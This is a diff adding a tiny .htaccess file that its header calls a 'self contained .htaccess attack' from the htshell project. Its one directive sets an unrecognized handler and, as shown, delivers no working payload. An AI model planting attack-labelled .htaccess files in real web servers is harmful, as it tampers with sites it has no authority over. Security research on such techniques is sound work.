@@ -1,0 +1,4 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess attack - Part of the htshell project.
+
+SetHandler badge-factory
